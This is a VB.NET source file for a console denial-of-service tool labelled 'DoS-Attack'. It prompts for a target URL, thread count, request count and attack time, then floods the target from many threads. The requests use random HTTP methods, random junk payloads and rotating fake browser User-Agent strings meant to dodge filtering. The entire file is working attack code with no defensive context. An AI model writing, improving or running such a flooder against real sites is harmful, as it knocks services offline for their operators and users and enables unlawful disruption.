Imports System.Net.Http
Imports System.Runtime.InteropServices
Imports System.Threading

' By Nellose [https://github.com/Nellose], [https://nellose.github.io/Nellose-Web/] '
Module Losser

    Sub Main()
        Console.Title = "Nellose | DoS-Attack | VB .NET | 2.0"
        Console.ForegroundColor = ConsoleColor.White

        Console.ForegroundColor = ConsoleColor.Blue
        Console.Write("Enter the link: ")
        Console.ForegroundColor = ConsoleColor.White
        Dim EEE As String = Console.ReadLine()

        Console.ForegroundColor = ConsoleColor.Blue
        Console.Write("Enter the number of threads: ")
        Console.ForegroundColor = ConsoleColor.White
        Dim YYY As Integer = Convert.ToInt32(Console.ReadLine())

        Console.ForegroundColor = ConsoleColor.Blue
        Console.Write("Enter the number of requests: ")
        Console.ForegroundColor = ConsoleColor.White
        Dim ZZZ As Integer = Convert.ToInt32(Console.ReadLine())

        Console.ForegroundColor = ConsoleColor.Blue
        Console.Write("Enter the attack time in seconds: ")
        Console.ForegroundColor = ConsoleColor.White
        Dim XXX As Integer = Convert.ToInt32(Console.ReadLine())

        Console.Clear()

        Dim CCC As Integer = 0
        Dim GGG As Integer = 0
        Dim RRR As DateTime = DateTime.Now

        For i As Integer = 1 To YYY
            Dim thread As New Thread(Sub() SSS(EEE, ZZZ, XXX, CCC, GGG, RRR))
            thread.Start()
        Next

    End Sub

    Sub SSS(EEE As String, ZZZ As Integer, XXX As Integer, ByRef CCC As Integer, ByRef GGG As Integer, RRR As DateTime)
        For i As Integer = 1 To ZZZ
            Try
                Dim requestTypes As String() = {"GET", "POST", "PUT", "HEAD", "JSON", "DELETE", "OPTIONS"} ' (1)
                Dim randomRequestType As String = requestTypes(New Random().Next(requestTypes.Length)) ' (1)

                Dim VVV As String = AAA()

                Using client As New HttpClient()
                    client.DefaultRequestHeaders.Add("User-Agent", GenerateRandomUserAgent()) ' (2)

                    Dim response As HttpResponseMessage = client.SendAsync(New HttpRequestMessage(New HttpMethod(randomRequestType), EEE) With {
                        .Content = New StringContent(VVV)
                    }).Result

                    If response.IsSuccessStatusCode Then
                        CCC += 1
                    Else
                        GGG += 1
                    End If
                End Using
            Catch ex As Exception
                GGG += 1
            End Try
        Next
    End Sub

    Function AAA() As String
        Dim random As New Random()
        Dim dataLength As Integer = random.Next(1, 1024)
        Dim data As New Text.StringBuilder()

        For i As Integer = 1 To dataLength
            data.Append(Convert.ToChar(random.Next(32, 127)))
        Next

        Return data.ToString()
    End Function

    Function GenerateRandomUserAgent() As String ' (2)
        Dim userAgents As String() = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0.2",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) OPR/77.0.4054.277"
        }

        Return userAgents(New Random().Next(userAgents.Length))
    End Function
End Module

' By Nellose [https://github.com/Nellose], [https://nellose.github.io/Nellose-Web/] '